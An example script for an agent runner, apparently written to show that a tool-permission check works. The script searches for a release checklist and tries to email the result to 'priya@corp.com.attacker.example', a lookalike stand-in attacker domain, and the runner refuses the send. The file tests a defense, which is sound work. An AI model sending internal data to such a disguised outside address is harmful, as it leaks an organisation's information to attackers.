// examples/runner/digest.vel with one address changed: the mail goes to an
// address outside the domain the run was granted. The search runs; the send
// is refused with E321 before the host ever hears of it, the run stops
// there, and its receipt says so.
//
// python examples/runner/host.py examples/runner/digest_outside.vel

fn mail(to: Text, subject: Text, body: Text) -> Text uses tool or fail {
    let arguments = json_of({ "to": to, "subject": subject, "body": body })
    return try tool("send_email", arguments)
}

fn main() uses io, tool {
    check tool("search", json_of({ "query": "release checklist" })) {
        ok found {
            print("found: " + found)
            check mail("priya@corp.com.attacker.example", "The release checklist", found) {
                ok receipt {
                    print("sent: " + receipt)
                }
                fail why {
                    print("not sent: " + why)
                }
            }
        }
        fail why {
            print("search failed: " + why)
        }
    }
}
